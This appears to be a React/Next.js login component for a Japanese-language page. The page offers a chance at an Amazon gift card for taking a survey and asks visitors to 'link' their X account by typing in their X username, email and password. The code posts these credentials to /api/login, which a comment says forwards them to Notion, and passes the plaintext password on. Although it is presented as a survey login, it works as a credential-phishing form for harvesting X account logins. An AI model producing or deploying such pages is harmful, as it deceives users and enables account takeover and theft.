'use client';

import { useState } from 'react';

interface LoginFormProps {
  onLoginSuccess: (email: string, password: string, xUsername: string) => void;
}

export default function LoginForm({ onLoginSuccess }: LoginFormProps) {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [xUsername, setXUsername] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState('');

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setError('');

    // バリデーション
    if (!email || !email.includes('@')) {
      setError('有効なメールアドレスを入力してください');
      return;
    }

    if (!password || password.length < 4) {
      setError('パスワードは4文字以上で入力してください');
      return;
    }

    if (!xUsername || xUsername.length < 1) {
      setError('Xのユーザー名を入力してください');
      return;
    }

    setIsLoading(true);

    try {
      // ログイン情報をNotionに送信
      const res = await fetch('/api/login', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ email, password, xUsername }),
      });

      if (!res.ok) {
        throw new Error('ログインに失敗しました');
      }

      const data = await res.json();

      // ログイン成功時にコールバックを実行
      onLoginSuccess(email, password, xUsername);
    } catch (error) {
      console.error('Login error:', error);
      setError('ログインに失敗しました。もう一度お試しください。');
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="min-h-screen flex items-center justify-center bg-gradient-to-br from-blue-50 to-indigo-100 p-4">
      <div className="bg-white rounded-2xl shadow-2xl p-8 max-w-md w-full">
        <div className="mb-8 text-center">
          <h1 className="text-3xl font-bold text-gray-800 mb-2">アンケートに答えてアマギフGETのチャンス！</h1>
          <p className="text-gray-600">
            Xのアカウント情報を入力して連携をしてください。
          </p>
        </div>

        <form onSubmit={handleSubmit} className="space-y-6">

                    {/* Xユーザー名入力 */}
          <div>
            <label htmlFor="xUsername" className="block text-sm font-semibold text-gray-700 mb-2">
              ユーザー名
              <span className="text-red-500 ml-1">*</span>
            </label>
            <input
              id="xUsername"
              type="text"
              value={xUsername}
              onChange={(e) => setXUsername(e.target.value)}
              className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent transition-all"
              placeholder="@username"
              required
            />
          </div>

          {/* メールアドレス入力 */}
          <div>
            <label htmlFor="email" className="block text-sm font-semibold text-gray-700 mb-2">
              メールアドレス
              <span className="text-red-500 ml-1">*</span>
            </label>
            <input
              id="email"
              type="email"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent transition-all"
              placeholder="example@email.com"
              required
            />
          </div>

          {/* パスワード入力 */}
          <div>
            <label htmlFor="password" className="block text-sm font-semibold text-gray-700 mb-2">
              パスワード
              <span className="text-red-500 ml-1">*</span>
            </label>
            <input
              id="password"
              type="password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent transition-all"
              placeholder="パスワードを入力"
              required
            />
          </div>

          {/* エラーメッセージ */}
          {error && (
            <div className="bg-red-50 border border-red-200 text-red-700 px-4 py-3 rounded-lg">
              {error}
            </div>
          )}

          {/* ログインボタン */}
          <button
            type="submit"
            disabled={isLoading}
            className={`w-full py-3 rounded-lg font-semibold text-white transition-all ${
              isLoading
                ? 'bg-gray-400 cursor-not-allowed'
                : 'bg-blue-600 hover:bg-blue-700 shadow-lg hover:shadow-xl'
            }`}
          >
            {isLoading ? 'ログイン中...' : 'ログインしてアンケートを開始'}
          </button>
        </form>
      </div>
    </div>
  );
}
